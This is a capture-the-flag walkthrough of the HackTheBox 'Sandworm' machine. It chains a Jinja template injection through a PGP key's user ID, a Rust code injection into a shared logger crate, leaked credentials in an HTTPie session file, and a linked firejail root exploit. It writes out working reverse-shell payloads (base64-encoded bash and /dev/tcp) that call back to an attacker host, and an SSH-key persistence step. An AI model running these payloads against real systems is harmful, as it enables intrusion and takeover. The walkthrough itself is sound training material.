# medium - Sandworm

## User Flag

Ok, let's start, the machine has a vhost listening to ssa.htb

```bash
z➤ curl -L sandworm.htb
curl: (6) Could not resolve host: ssa.htb
```

We can just see a simple web page:
```bash
~z➤ curl -s -L -k ssa.htb | elinks --dump
   [1]Secret Spy Agency

     • [2]Home
     • [3]About
     • [4]Contact
                                  Our Mission
   We leverage our advantages in technology and cybersecurity consistent with
   our authorities to strengthen national defense and secure national
   security systems.
...
```

By looking source of the pages I've found this tool:
```bash
~z➤ curl -s -L -k ssa.htb/contact  | ag href
        <link rel="icon" type="image/x-icon" href="/static/favicon.ico"/>
        <link rel="stylesheet" href="/static/bootstrap-icons2.css">
        <link href="/static/bootstrap-icons.css" rel="stylesheet" />
        <link href="/static/styles.css" rel="stylesheet" />
                <a class="navbar-brand" href="/">Secret Spy Agency</a>
                            <li class="nav-item"><a class="nav-link" aria-current="page" href="/">Home</a></li>
                            <li class="nav-item"><a class="nav-link" href="/about">About</a></li>
                        <li class="nav-item"><a class="nav-link active" href="#!">Contact</a></li>
                          <p>Don't know how to use PGP? Check out our <a href="/guide" class="key">guide</a></p>
```

{{< limg "/i/2023-08-08_10-21.png" "PGP tool" >}}

Basically we have to send only encrypted text on page `/contact` using their PGP demo tool.

I also know that, the site is using Flask (?):
```html
<p class="m-0 text-center text-white opacity-100 fst-italic">Powered by Flask&trade; </p>
```

So, it all leads that there might be a CLI way to validate those PGP Signatures, also, given I saw it is using Flask so Jinja should be the Templating system.

Let's generate something that cannot be escaped properly by Jinja, instead processed/evaluted. Let's use the `name` field of a GPG UID.
```bash
gpg --gen-key   # Generating PGP Key
gpg --edit-key XXXXXXXXX    # Edit the generated PGP Key

# Let's add a UID
gpg> adduid
Real name: {{9*9}}
Email address: foo@bar.com
Comment:

gpg> trust
gpg> save
```

Ok, now let's export the public PGP key and generate a dummy text so we can validate the signature in https://ssa.htb/guide/encrypt
```bash
gpg --armor --export 'lol' > pub.asc

z➤ echo 'test' | gpg --clear-sign
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
-----BEGIN PGP SIGNATURE-----

iQGzBAEBCAAdFiEElEYdb9ECXVfTY/cqwGZaQgS3h8EFAmTVedwACgkQwGZaQgS3
h8F42gv/cp9Rwmj3nr/EAe6R0B+4tEHPKNEZHl3xQHLd1nfiyPzgSODQpzwROzQW
B9grdnKC0Lz91zmQL6sy+UNg1cflqBgcDtE/vj0KdewoGSa3s0NmowilyBII5ebJ
GBIPH8sOrlBUQE6CyS8uTdXADi81dAe7U6gVZI+4Z6D2s6Ni7A+MK24B1MdMAxS/
BsN0Wec5tZPe0xMrlJkcYKvpqB7NYJv+NfZaGPQ5lslvG4/wkbkl8gXerlUXtuw/
bIhJAG6IIR6/8PPi9/1fuxsg3XBdaSncaRzv+kL+jNu3WpqLYO0mI62Sl7bibWGk
EOLWMOlMd/onAabLKC38aSYZHtwTwsJkpAvJSZULOqgonfMx1e7hLd2ZE+4qdQhU
gVnlE0xPotolcUtK43504EltXuQGn+nJ4uWm3x9fNmxrnJVvYVK8WEH/9mt936cH
a2bnrb9UsNy7Oj5BSZDYDC6LUK1dxneIvxKeZ6g49LqvyGYeojdbV+Vn0INufbNW
c+kyZk+6
=CibY
-----END PGP SIGNATURE-----
```

And voilá, the `9*9` has been processed and evaluted, I tested other examples as well, you can see the screenshot:
{{< limg "/i/2023-08-10_19-53.png" "Server Side Templating Injection" >}}

### Rev Shell access

Ok, so we just need to get a reverse shell with the SSTI vuln. Thanks to PayloadAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#exploit-the-ssti-by-calling-ospopenread

First, let's get a bash revshell:
{{< limg "/i/2023-08-10_20-05.png" "revshell" >}}

Second, let's build or payload so we can exploit Jinja via `gpg`:
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43LzU1NTU1IDA+JjE= | base64 -d | bash" ').read() }} `

Third, now we add a new `uid` into our PGP Key, we export the pub key, we generate a dummy signed text and we try to validate the Signature.

{{< limg "/i/2023-08-10_20-09.png" "Injection" >}}
{{< limg "/i/2023-08-10_20-10.png" "Injection" >}}

You will notice the page will hang, that means we've got it:
```bash
z➤ nc -lvnp 55555
Connection from 10.10.11.218:60890
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
atlas@sandworm:/var/www/html/SSA$

atlas@sandworm:/var/www/html/SSA$ cat /etc/passwd
cat /etc/passwd
...
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
silentobserver:x:1001:1001::/home/silentobserver:/bin/bash
atlas:x:1000:1000::/home/atlas:/bin/bash
```

This user didn't have the flag, I was not even able to use `find` commmand, I got "Command not found" all the time. This `atlas` user had this file with credentials for the user we saw in the `/etc/passwd` file, `silentobserver`:

```bash
atlas@sandworm:~$ cat .config/httpie/sessions/localhost_5000/admin.json

cat .config/httpie/sessions/localhost_5000/admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        ...
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
...
```

SSHing:
```bash
~➤ ssh silentobserver@ssa.htb
...
Last login: Mon Jun 12 12:03:09 2023 from 10.10.14.31
silentobserver@sandworm:~$ ls
user.txt
silentobserver@sandworm:~$ id
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
```

## Root Flag

This user doesn't have `sudo`, but I've found something interesting, some .git repos.

```bash
silentobserver@sandworm:~$ sudo -l
[sudo] password for silentobserver:
Sorry, user silentobserver may not run sudo on localhost.

silentobserver@sandworm:~$ find / -type d -name .git 2>/dev/null
/opt/tipnet/.git
/opt/crates/logger/.git
/home/silentobserver/.cargo/registry/index/github.com-1ecc6299db9ec823/.git
/home/atlas/.cargo/registry/index/github.com-1ecc6299db9ec823/.git
```

`/opt/tipnet` Doesn't seem to be helpful:
```bash
silentobserver@sandworm:/opt/tipnet$ find . -type f 2>/dev/null | egrep -v 'debug' | xargs -I{} ls -ltra {}
-rw-r--r-- 1 root atlas 288 May  4 15:50 ./Cargo.toml
ls: cannot access './.git/config': Permission denied
ls: cannot access './.git/description': Permission denied
ls: cannot access './.git/HEAD': Permission denied
-rwxr-xr-- 1 root atlas 8 Feb  8  2023 ./.gitignore
-rwxr-xr-- 1 root atlas 177 Feb  8  2023 ./target/CACHEDIR.TAG
-rwxr-xr-- 1 root atlas 1035 Feb  8  2023 ./target/.rustc_info.json
-rwxr-xr-- 1 root atlas 5795 May  4 16:55 ./src/main.rs
-rw-r--r-- 1 root atlas 46161 May  4 16:38 ./Cargo.lock
-rw-rw-r-- 1 atlas atlas 25062 Aug 11 00:28 ./access.log
```

`/opt/crates/logger` has files owned by `atlas` but also owned by group `silentobserver`, plus, some writeable files:
```bash
silentobserver@sandworm:/opt/crates/logger$ find . -type f 2>/dev/null | egrep -v 'debug|.git' | xargs -I{} ls -ltra {}
-rw-r--r-- 1 atlas silentobserver 190 May  4 17:08 ./Cargo.toml
-rw-rw-r-- 1 atlas silentobserver 177 May  4 17:08 ./target/CACHEDIR.TAG
-rw-rw-r-- 1 atlas silentobserver 1035 May  4 17:08 ./target/.rustc_info.json
-rw-rw-r-- 1 atlas silentobserver 732 May  4 17:12 ./src/lib.rs
-rw-r--r-- 1 atlas silentobserver 11644 May  4 17:11 ./Cargo.lock

```

So let's see what is we have ownership as group and is writeable:
```bash
silentobserver@sandworm:/opt/crates/logger$ cd /opt/crates/logger; \
     find . -group $(id -g) -perm -g=w -type f 2>/dev/null \
     | egrep -v 'target|.git' \
     | xargs -I{} ls -ltra {}
-rw-rw-r-- 1 atlas silentobserver 732 May  4 17:12 ./src/lib.rs


silentobserver@sandworm:/opt/crates/logger$ cat /opt/crates/logger/src/lib.rs
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;

pub fn log(user: &str, query: &str, justification: &str) {
    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

Ok, this `logger` component is used by `tipnet` app, if we can modify this `./src/lib.rs` file then we can get it to execute anything by `atlas` user. So first let's open a reverse shell from Rust, let's add this code in the lib.rs file, right after the function `pub fn log(){.....`:
```rust
use std::process::Command;

  Command::new("bash")
          .arg("-c")
          .arg("bash -i >& /dev/tcp/10.10.14.7/55555 0>&1")
          .output()
          .expect("failed to execute process");
```

Then let's build it: `cd /opt/crates/logger/src; cargo build`
{{< limg "/i/2023-08-10_20-51.png" "building logger" >}}

And now we've got a revshell :evil:
```bash
z➤ nc -lvnp 55555
Connection from 10.10.11.218:37238
bash: cannot set terminal process group (3802): Inappropriate ioctl for device
bash: no job control in this shell
atlas@sandworm:/opt/tipnet$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
```

Humm, weird, now we can run `find` command. I've found a suid bin file "firejail":
```bash
atlas@sandworm:~/.ssh$ find / -perm -4000 -user root 2>/dev/null | xargs -I{} ls -ltra {}
<000 -user root 2>/dev/null | xargs -I{} ls -ltra {}

-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
-rwsr-xr-- 1 root messagebus 35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
-rwsr-xr-x 1 root root 47480 Feb 21  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 232416 Apr  3 18:00 /usr/bin/sudo
-rwsr-xr-x 1 root root 72072 Nov 24  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 35192 Feb 21  2022 /usr/bin/umount
-rwsr-xr-x 1 root root 59976 Nov 24  2022 /usr/bin/passwd
-rwsr-xr-x 1 root root 44808 Nov 24  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 72712 Nov 24  2022 /usr/bin/chfn
-rwsr-xr-x 1 root root 40496 Nov 24  2022 /usr/bin/newgrp
-rwsr-xr-x 1 root root 55672 Feb 21  2022 /usr/bin/su
-rwsr-xr-x 1 root root 35200 Mar 23  2022 /usr/bin/fusermount3
```

Ok, just to have a better shell I put my ssh pub key under the user `atlas` and I login again:
```bash
cat <<EOF >>~/.ssh/authorized_keys
ssh-rsa AAA.....
EOF
```

Ok, so by gooling any CVE about `firejail`, I've found this which provides a python script: https://gist.github.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25 which by the way is just a copy/paste without the headers :smile: the original one is posted here: https://www.openwall.com/lists/oss-security/2022/06/08/10/1
Finally, here the report: https://www.openwall.com/lists/oss-security/2022/06/08/10

{{< limg "/i/2023-08-10_21-05.png" "got root" >}}

## TODOs

- Review the exploit report PoC in deepth
